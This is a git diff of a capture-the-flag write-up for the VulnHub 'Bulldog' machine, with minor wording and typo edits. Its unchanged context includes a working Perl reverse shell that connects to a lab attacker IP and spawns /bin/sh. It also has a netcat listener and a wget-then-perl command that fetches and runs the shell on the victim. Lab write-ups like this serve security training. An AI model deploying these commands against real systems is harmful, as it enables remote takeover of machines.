@@ -11,7 +11,7 @@ finished: true
 
 # Intro
 
-[Bulldog](https://www.vulnhub.com/entry/bulldog-1,211/) is an intermediate level machine made by [Nick](https://twitter.com/@frichette_n) with supposedly multiple levels of entry. Hopefully you will enjoy your stay and read the whole blog. Let's get started! 
+[Bulldog](https://www.vulnhub.com/entry/bulldog-1,211/) is an intermediate level machine with supposedly multiple levels of entry made by [Nick](https://twitter.com/@frichette_n) . Hopefully you will enjoy your stay and read the whole blog. Let's get started! 
 
 ***
 
@@ -94,7 +94,7 @@ Nmap done: 1 IP address (1 host up) scanned in 31.34 seconds
            Raw packets sent: 1191 (54.980KB) | Rcvd: 1179 (49.576KB)
 ```
 
-SSH running on port 23? Odd. 2 web servers, one on 80 and other on 8080? Odd as well. Hopefully we can get something out of this! I launch dirb - `dirb 192.168.0.199` and proceed to manually browse the webpage for visual clues.    
+SSH running on port 23? Odd. 2 web servers, one on 80 and other on 8080? Odd as well. Hopefully we can get something out of this! I launch dirb *(to find hidden directories)*  - `dirb 192.168.0.199` and proceed to manually browse the webpage for visual clues.    
 
 <img src="/img/blog/bulldog/Bulldog01.png">
 
@@ -233,7 +233,7 @@ Time to get a sweet shell. This writeup is *metesploit-free* which means we will
 3. Start our apache2 or python SimpleHTTPServer (*/etc/init.d/apache2 start*)
 4. Make the victim download our malicious file via wget from the server & run it.
 
-[Pel shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
+[Perl shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
 {% highlight perl %}
 
 use Socket;$i="192.168.0.213";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
@@ -241,6 +241,7 @@ use Socket;$i="192.168.0.213";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobynam
 {% endhighlight %}
 
 `192.168.0.213 - machine for reverse connection (in this case my kali)`
+
 `1234 - port to connect back to` 
 
 After we launch netcat listener - `nc -lvp 1234`, download and run the perl file on victim machine using: `pwd && wget 192.168.0.213/shell.pl && perl shell.pl`. *wget* downloads the file and *perl* compiles + runs it. 
